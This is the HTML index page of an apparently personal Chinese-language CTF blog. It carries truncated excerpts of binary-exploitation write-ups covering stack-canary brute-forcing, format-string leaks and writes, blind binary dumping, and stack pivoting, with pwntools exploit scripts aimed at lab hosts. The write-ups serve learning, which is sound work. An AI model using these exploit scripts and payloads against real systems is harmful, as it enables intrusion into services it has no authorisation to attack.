@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ctf | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="ctf - CAI dog">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/ctf/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ctf" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ctf"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span class="active">ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a></div>
+  <h1>
+    ctf
+  </h1>
+</header>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>[置顶] 注意事项
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>由于不可抗因素，以下的ctf不会提供二进制文件，并且一些文章的结构会有所缺失，请理解 </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to [置顶] 注意事项" href="https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>enumcanary
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先拿到文件我们先查看保护机制：
+可以看到，这道题是打开了栈溢出检测的。
+然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
+可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
+程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
+然后通过ida我们可以看到程序会打开一个‘./flag’文件：
+这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
+然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
+最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
+对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
+爆破canary的基本逻辑为：
+我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&#34;\x00&#34;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
+假如canary如图：
+我们按位进行爆破：
+那么，我们就可以通过fork函数，对canary进行爆破：
+from pwn import *context.log_level = &#39;debug&#39;canary = b&#34;\x00&#34;padding = b&#34;a&#34;*264for x in range(7):for y in range(1,0x100):p = remote(&#34;127.0.0.1&#34;,10011)print(p.recv())p.send(padding&#43;canary&#43; bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary &#43;= bytes([y])print(&#34;success get blasting!&#34;)print(&#39;type =&#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
+可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：...</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to enumcanary" href="https://jellyfish-pro.github.io/ctf/enumcanary/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format0
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先我们检查保护机制：
+我们可以看到有canary，可以修改got表。
+这里我们第一反应应该是采用泄露canary和修改got表的办法。
+但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
+由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
+然后我们进入IDA查看这个文件：
+我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
+因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
+我们到GDB中调试查看一下程序具体的流程：
+在memset函数这里初始化了两个栈空间：
+然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
+然后程序让我们输入v2字符串，放到栈空间中去：
+然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
+程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
+%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
+x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
+而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
+payload = b&#39;%*10$c%*11$c%9$lln&#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
+完整的exp为：
+from pwn import *#context.log_level = &#39;debug&#39;#p = process(&#39;./format0&#39;)p = remote(&#39;10.0.25.109&#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&#39;your name:&#39;)payload = b&#39;%*10$c%*11$c%9$lln&#39;p.sendline(payload)p.recvuntil(&#39;you shell...&#39;)p.sendline(&#39;a&#39;)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format0" href="https://jellyfish-pro.github.io/ctf/format0/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先我们查看一下保护机制：
+可以看到，这道题是打开了canary保护。之前做stack smaches时，我们了解了如何利用canary溢出报错来打印我们需要的flag。
+canary检测机制 虽然当时我们了解到，canary检测到溢出之后，会调用stack_chk_fail函数，并且在这个函数里打印字符串。但是，我们当时并没有说明。canary保护是怎么检测到溢出的，现在利用这道题，我们可以了解一下canary检测方式和绕过canary的方法。
+通过IDA我们可以发现，这个函数的功能函数有俩个gets函数：
+v1的大小为30h（48个字节）
+我们知道，gets函数有着溢出的风险，那么通过这俩个gets函数，我们来看一看canary是如何检测溢出的。
+首先我们在gets函数和printf函数处打上断点。
+然后来到第一个gets函数里，步进到_IO_getline函数处：
+这里我们随便输入一个不会产生溢出的值，我输入的为‘as&#39;
+输入之后，利用stack 20指令查看栈空间,找到程序存放‘as’的地方：
+在上面查看IDA时，我们发现存放字符的空间大小为30h（48字节）。那么，在栈空间里，字符可以存放的大小为：48/8=6排。
+可以看到，在图中我们输入的值后的第六排，有一个八个字符、以\x00结尾的无规律字符串0x9a05e8afeb322300。
+这个八位字符，就是canary生成的检测字符，如果这个字符改变，则canary就会在程序结束时调用stack_chk_fail函数。canary不是固定的，但最后一个字节一定是\x00。
+我们在gdb里观察一下：
+我们可以正常返回main函数：
+然后我们使用c指令，来到第二个gets函数处，这里我们尝试溢出来改变canary的值。
+可以看到这里canary已经改变了，接着我们接着执行：
+在程序结束时，程序调用了stack_chk_fail函数。
+绕过canary 因为canary保护需要检测canary的值有没有被改变。那么我们在构造payload时，将原本的canary值放到canary本来的地址上，就好了。
+利用printf函数泄露canary值 因为canary每次都不同，意味着我们每次都需要改变canary的值。
+那么如何获得程序中canary的值呢。
+这里我们就可以利用printf函数来进行泄露。
+%n$p //n代表第几个参数，p表示打印的是一个地址。 我们在gdb中查看，canary是第几个参数：
+因为64为前6个参数通过寄存器传递，所以是这里第10个。
+接着我们尝试输入%10$p尝试一下：
+可以看到，并不是canary，而是canary上方的地址，说明我们应该输入%11$p
+构造exp 接下来我们就可以构造exp了：
+sys_addr = 0x4006E7	//system函数地址payload1 = &#39;%11$p&#39;p.sendline(payload1)canary =int( p.recv(18),base = 16)	//将接收到的canary转化为16进制的int类型print(&#39;canary =&#39;,hex(canary))canary_val = canary.to_bytes(9,&#39;little&#39;)	//将int类型的canary转为bytes #format1from pwn import *#p = process(&#39;./format1&#39;)p = remote(&#39;10.0.25.109&#39;,20000)a = 0x400760if args....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format1" href="https://jellyfish-pro.github.io/ctf/format1/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format2_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>我们首先还是先远程连接一下这个程序：
+发现程序的逻辑为输入什么就输出什么。
+那我们修改一下dump脚本，直接泄露：
+from pwn import *proc = &#39;./format2&#39;#context.log_level = &#39;debug&#39;def leak(b_addr , a):#p = process(proc)p = remote(&#39;10.0.25.109&#39;,20001)b_addr1 = str(hex(b_addr))print(&#39;b_addr1 =&#39;,hex(b_addr))if b_addr1[-2:] == &#39;0a&#39;:info = b&#34;\x00&#34;else:pad = b&#39;%7$s.tmp&#39;&#43;p64(b_addr)#gdb.attach(p)p.sendline(pad)p.recvuntil(&#39;me!&#39;)p.recvuntil(&#39;\n&#39;)info = p.recvuntil(&#39;.tmp&#39;, drop=True)if not info :info = b&#34;\x00&#34;p.close()return infob_addr = 0x400680b_end = 0x400a00res = b&#39;&#39;a = 0while b_addr&lt;b_end:info = b&#39;&#39;info = leak(b_addr,a)print(&#39;leak = &#39;,info)a &#43;=1b_addr &#43;= len(info)res &#43;= infoprint(&#39;leak_addr = &#39;,hex(b_addr))#print(&#39;res = &#39;,res)print(&#34;dump length is: &#34;, len(res))with open(&#34;dump_file2&#34;, &#34;wb&#34;) as f:f....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format2_new" href="https://jellyfish-pro.github.io/ctf/format2_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format2_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>这道题是一道blind-pwn，也就是盲打。不会提供binary，需要我们利用格式化字符串对binary进行泄露。因为格式化字符串泄露的为内存空间，所以泄露出来的binary可能会存在混乱、残缺等问题。
+首先我们先连接一下这道题：
+注：因为32位的远程连接已经替换为64位，所以我们使用本地文件模拟泄露。 打开文件后，显示字符串“ping me”
+然后我们随意输入字符，程序都会输出我们输入的字符：
+如果不输入字符串直接回车的话，就会显示哭泣：
+那么根据格式化字符串的原理，我们需要知道其偏移量，也就是我们输入的字符串是放在相对于格式化字符串的第几个参数。
+我们使用下面的指令查看：
+aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以看到，是第七个参数。
+我们再尝试输入
+bbbb%7$p 程序讲bbbb的十六进制输出了出来，证明偏移量的确是7。
+知道了偏移量接下来就是泄露binary文件：
+from pwn import *proc = &#39;./format2&#39;def leak(b_addr , a):p = process(proc)pad = b&#39;%9$s.tmp&#39;&#43;p32(b_addr)p.sendline(pad)p.recvuntil(&#39;me&#39;)p.recvuntil(&#39;\n&#39;)info = p.recvuntil(&#39;.tmp&#39;, drop=True)if not info :info = b&#34;\x00&#34;p.close()return infob_addr = 0x8048000b_end = 0x0804A000res = b&#39;&#39;a = 0try:while b_addr &lt;= b_end:info = b&#39;&#39;print(&#39;leak2 = &#39;,info)info = leak(b_addr,a)print(&#39;leak = &#39;,info)a &#43;=1b_addr &#43;= len(info)res &#43;= infoprint(&#39;leak_addr = &#39;,hex(b_addr))#print(&#39;res = &#39;,res)except Exception as e:print(e)	print(&#34;dump length is: &#34;, len(res))with open(&#34;dump_file1&#34;, &#34;wb&#34;) as f:f....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format2_old" href="https://jellyfish-pro.github.io/ctf/format2_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format3_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先检查保护机制：
+不能修改got表，有栈溢出检测
+接着运行一下程序：
+程序会让我们分别输入两次，然后再打印分别将两次输入打印出来。
+我们输入什么就会输出什么，这里可能存在格式化字符串的漏洞，我们接下来将二进制文件拖进IDA中：
+在IDA中我们很容易看到，在main函数里调用了有两个格式化漏洞的函数。同时为了方便下文引用，将这个函数重命名为func。
+同时，我们也可以在文件中找到一个system函数：
+那么现在这道题思路就是：
+1. 利用第一个printf函数泄露func函数的rbp
+2. 通过rbp，定位存放func函数的返回地址的地址
+3. 利用第二个printf函数的格式化字符串漏洞，修改返回地址为system函数
+首先我们泄露main函数调用func函数时，压入的rbp。
+我们进入gdb，将断点打在func函数处，然后步进到第一个printf函数处，然后查看栈信息：
+可以看到rbp相对于格式化字符串的偏移量为：44，所以我们泄露rbp的exp为：
+from pwn import *context.log_level=&#34;debug&#34;#p=process(&#34;./format3&#34;)p = remote(&#39;10.0.25.109&#39;,20003)payload = &#39;%44$p&#39;sys_addr = 0x400817#gdb.attach(p)	//因为内存地址随时会变，所以需要进入gdb查看输出是否正确p.recvuntil(&#39;name:&#39;)p.sendline(payload)p.recvuntil(&#39;\n&#39;)leak = int(p.recvuntil(&#39;Please&#39;,drop = True),base = 16)print(&#39;leak =&#39;,hex(leak))	//泄露出来的rbpret_addr = leak - 0x8	//rbp的地址减去8，就是func函数返回地址所在值print(&#39;ret_addr =&#39;,hex(ret_addr)) 可以看到无论是泄露的内存地址，还是存放func返回值的地址都是匹配的。
+然后我们就需要利用第二个printf函数将返回值改为system函数的地址：
+可以看到返回值为0x40098c，system函数地址为0x400817只有两个字节不同，所以我们使用%hn进行修改
+0x0817 = 2071，所以我们需要输出2071个字符
+payload2 =b&#39;%2071c%12$hnaaaa&#39; //最后四个‘a’,是用来填充内存的，试内存得以对齐payload2 &#43;= p64(ret_addr) 完整的exp：
+from pwn import *context....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format3_new" href="https://jellyfish-pro.github.io/ctf/format3_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format3_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看保护机制：
+可以看到got表不能修改，没有栈溢出检查和地址随机化
+按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
+运行程序首先是打印几排字符串，让我们先注册：
+我们注册后会显示注册成功：
+然后跳出菜单让我们选择：
+三个选项，如果输入1，就会显示我们刚刚注册的账户：
+如果选择2，则会让我们重新输入username和password：
+如果选择3，则会退出。
+然后我们再进入IDA中查看：
+这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
+通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
+我们在IDA中找到输出账户和密码的函数：
+可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
+同时，我们可以在IDA中找到，system函数：
+然后我们进入gdb，断点打在show函数处，查看偏移量：
+可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
+那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
+我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
+0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
+所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
+from pwn import *context.log_level=&#34;debug&#34;#p=process(&#34;./format3&#34;)p = remote(&#39;10.0.25.109&#39;,20003)binary=ELF(&#34;format3&#34;)#gdb.attach(sh)p.recvuntil(&#39;Input your username(max lenth:20):&#39;)p.sendline(&#39;.tmp&#39;)p.recvuntil(&#39;Input your password(max lenth:20):&#39;)p.sendline(&#39;%6$p&#39;)p.recvuntil(&#39;Register Success!!\n&#39;)p.sendline(&#39;1&#39;)p.recvuntil(&#39;.tmp\n&#39;)rbp = int(p.recvline(),base = 16)print(&#39;rbp = &#39;,hex(rbp))ret_addr = rbp - 0x38print(&#39;ret_addr = &#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。...</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format3_old" href="https://jellyfish-pro.github.io/ctf/format3_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format4_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先我们查看保护机制：
+可以看到，打开了canary。
+接着我们运行程序：
+程序的功能类似于一个记事本，输入‘1’添加消息，输入‘2’显示输入的消息。
+因为程序会输出我们输入的东西，那么就有可能存在格式化字符串漏洞，我们输入连续的.%P进行尝试：
+可以看到输出了内存中的值，那么我们就可以利用这个格式化字符串漏洞。
+要利用格式化字符串漏洞，我们需要知道偏移量，这里我们进入gdb进行调试。
+这里我们在格式化字符串漏洞处下断点（格式化字符串漏洞的地址可以在ida中进行查看）：
+然后将程序跑起来：
+输入message后，再选择“Show Message”。gdb就会将程序断在断点处：
+我们可以看到，程序并没有将我们输入的字符串存放在栈中，而是存放在了一个很明显不是栈的地址。
+通过vmmap指令，我们可以知道，这个地址是在堆中：
+存放在了堆上，我们就不能通过泄露canary覆盖返回地址的方法了。
+虽然我们不能使用栈溢出覆盖返回地址，但是我们可以使用leave栈迁移的方法，将栈转移到一个虚假的栈上。
+leave = MOV RSP, RBPPOP RBP 通过这个指令会将RBP的值赋给RSP，那么如果我们将栈中的RBP的值给修改了，运行到leave指令时，RSP就会转跳到我们指定的地址。
+所以，我们通过程序的写入功能，在堆上写入一个ROP链，使用格式化字符串的写入功能，改变RBP。然后利用leave指令，将栈迁移到ROP链的地址上。
+使用这个方法，我们需要先泄露libc的版本，找到基地址、system函数的地址和“/bin/sh”字符串的地址。
+在gdb中我们可以看到__libc_start_main函数的偏移量：
+偏移量为0xf&#43;6=21。
+注：这里我们泄露出来的不是（______libc_start_main）而是（__libc_start_main&#43;240）,所以泄露出来的地址需要减去240 from pwn import *context.log_level = &#39;debug&#39;#p = process(&#39;format4&#39;)p = remote(&#39;10.0.25.109&#39;,20004)pop_rdi_ret = 0x400c03def add(payload):lenth = len(payload)p.recvuntil(&#39;Exit.&#39;)p.sendline(&#39;1&#39;)p.recvuntil(&#39;Please enter your message length:&#39;)p.sendline(str(lenth))p.recvuntil(&#39;Please enter your Message:&#39;)p.sendline(payload)#--------------------------------第一次输入--------------------------------------payload = b&#39;%21$p.tmp&#39;add(payload)p.recvuntil(&#39;Exit.&#39;)p.sendline(&#39;2&#39;)p.recvuntil(&#39;Message3: 0x&#39;)leak = int(p....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format4_new" href="https://jellyfish-pro.github.io/ctf/format4_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>format4_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看保护机制：
+32位程序，开启了栈溢出保护和NX，可以修改got表
+然后我们运行程序，查看程序的内容：
+可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
+根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
+然后我们在IDA中查看文件：
+这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
+现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
+答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
+而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
+所以这道题我们不能直接利用%n修改栈中的值来获得shell。
+那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
+1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
+所以我们还是要泄露程序的libc版本：
+from pwn import *sh = process(&#39;./format4&#39;)#sh = remote(&#39;10.0.25.109&#39;,20004)contact = ELF(&#39;./format4&#39;)#context.log_level = &#39;debug&#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;Contact info: \n&#39;)sh.recvuntil(&#39;Name: &#39;)sh.sendline(name)sh.recvuntil(&#39;You have 10 numbers\n&#39;)sh.sendline(phone)sh.recvuntil(&#39;Length of description: &#39;)sh.sendline(descrip_len)sh.recvuntil(&#39;description:\n\t\t&#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&#39;&gt;&gt;&gt; &#39;)sh.sendline(&#39;4&#39;)sh.recvuntil(&#39;Contacts:&#39;)sh.recvuntil(&#39;Description: &#39;)printf = 0x08048BD1# get system addr &amp; binsh_addrpayload = &#39;%31$paaaa&#39;createcontact(&#39;1111&#39;, &#39;1111&#39;, &#39;111&#39;, payload)printcontact()libc_start_main_ret = int(sh....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to format4_old" href="https://jellyfish-pro.github.io/ctf/format4_old/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="https://jellyfish-pro.github.io/ctf/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
